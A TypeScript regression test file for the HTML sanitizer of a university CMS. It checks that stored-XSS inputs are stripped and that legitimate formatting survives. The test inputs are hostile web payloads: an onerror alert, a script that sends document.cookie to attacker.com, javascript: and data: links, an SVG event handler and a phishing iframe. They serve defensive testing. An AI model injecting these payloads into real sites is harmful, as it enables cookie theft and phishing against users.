import { sanitizeRichText } from "../src/lib/security/htmlSanitizer";

interface TestCase {
  name: string;
  input: string | null | undefined;
  assertion: (output: string) => boolean;
  failureMessage: string;
}

const testCases: TestCase[] = [
  {
    name: "TC-XSS-001: Strips onerror attribute from img tags and removes unauthorized img",
    input: '<img src="x" onerror="alert(\'xss\')">',
    assertion: (out) => !out.includes("onerror") && !out.includes("alert"),
    failureMessage: "Failed to strip onerror attribute or alert payload",
  },
  {
    name: "TC-XSS-002: Strips script tags and inner JavaScript executable payloads",
    input: '<p>Before</p><script>window.location="https://attacker.com?c="+document.cookie</script><p>After</p>',
    assertion: (out) => !out.includes("<script") && !out.includes("attacker.com") && out.includes("<p>Before</p>") && out.includes("<p>After</p>"),
    failureMessage: "Failed to strip script tag or its contents",
  },
  {
    name: "TC-XSS-003: Neutralizes javascript: pseudo-protocol in anchor href attributes",
    input: '<a href="javascript:alert(document.domain)">Click to register</a>',
    assertion: (out) => !out.includes("javascript:") && !out.includes("alert") && out.includes("Click to register"),
    failureMessage: "Failed to neutralize javascript: scheme in anchor tag",
  },
  {
    name: "TC-XSS-004: Neutralizes data: pseudo-protocol in anchor href attributes",
    input: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Malicious Link</a>',
    assertion: (out) => !out.includes("data:") && out.includes("Malicious Link"),
    failureMessage: "Failed to neutralize data: scheme in anchor tag",
  },
  {
    name: "TC-XSS-005: Strips SVG payloads containing active event handlers or script tags",
    input: '<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>',
    assertion: (out) => !out.includes("onbegin") && !out.includes("alert"),
    failureMessage: "Failed to strip SVG onbegin event handler",
  },
  {
    name: "TC-XSS-006: Strips iframes and embedded unauthorized objects",
    input: '<iframe src="https://phishing-geeta.com/login"></iframe>',
    assertion: (out) => !out.includes("<iframe") && !out.includes("phishing"),
    failureMessage: "Failed to strip iframe tag",
  },
  {
    name: "TC-XSS-007: Strips style tags and inline CSS expression vectors",
    input: '<p style="behavior: url(xss.htc); color: red;">Styled Text</p>',
    assertion: (out) => !out.includes("behavior") && out.includes("Styled Text"),
    failureMessage: "Failed to strip malicious style attribute",
  },
  {
    name: "TC-XSS-008: Preserves legitimate university rich-text formatting and headings",
    input: '<h3>School of Computer Science</h3><p>Offering <b>B.Tech</b> &amp; <i>M.Tech</i> programs in <strong>AI &amp; Data Science</strong>.</p>',
    assertion: (out) =>
      out.includes("<h3>School of Computer Science</h3>") &&
      out.includes("<b>B.Tech</b>") &&
      out.includes("<i>M.Tech</i>") &&
      out.includes("<strong>AI &amp; Data Science</strong>"),
    failureMessage: "Failed to preserve legitimate rich text elements",
  },
  {
    name: "TC-XSS-009: Automatically adds rel=\"noopener noreferrer\" to target=\"_blank\" external links",
    input: '<a href="https://geetauniversity.edu.in/admissions" target="_blank">Admissions Portal</a>',
    assertion: (out) => out.includes('rel="noopener noreferrer"') && out.includes('target="_blank"'),
    failureMessage: "Failed to inject rel=\"noopener noreferrer\" onto target=\"_blank\" links",
  },
  {
    name: "TC-XSS-010: Handles null, undefined, empty, and non-string inputs safely without throwing",
    input: null as any,
    assertion: (out) => out === "",
    failureMessage: "Failed to handle null safely",
  },
  {
    name: "TC-XSS-011: Preserves safe tables, lists, and quotes for academic course structures",
    input: '<ul><li>Semester 1</li><li>Semester 2</li></ul><blockquote>Accredited by UGC</blockquote>',
    assertion: (out) => out.includes("<ul>") && out.includes("<li>Semester 1</li>") && out.includes("<blockquote>Accredited by UGC</blockquote>"),
    failureMessage: "Failed to preserve safe list or blockquote formatting",
  },
];

console.log("================================================================================");
console.log("GEETA UNIVERSITY CMS - HTML SANITIZATION & STORED XSS REGRESSION TEST SUITE");
console.log("================================================================================");

let passed = 0;
let failed = 0;

for (const tc of testCases) {
  try {
    const output = sanitizeRichText(tc.input);
    if (tc.assertion(output)) {
      console.log(`[✓ PASS] ${tc.name}`);
      passed++;
    } else {
      console.error(`[✗ FAIL] ${tc.name}: ${tc.failureMessage}`);
      console.error(`         Input:  ${tc.input}`);
      console.error(`         Output: ${output}`);
      failed++;
    }
  } catch (err: any) {
    console.error(`[✗ ERROR] ${tc.name}: Threw exception: ${err.message}`);
    failed++;
  }
}

console.log("================================================================================");
console.log(`RESULT: ${passed}/${testCases.length} tests passed (${failed} failures).`);
console.log("================================================================================");

if (failed > 0) {
  process.exit(1);
}
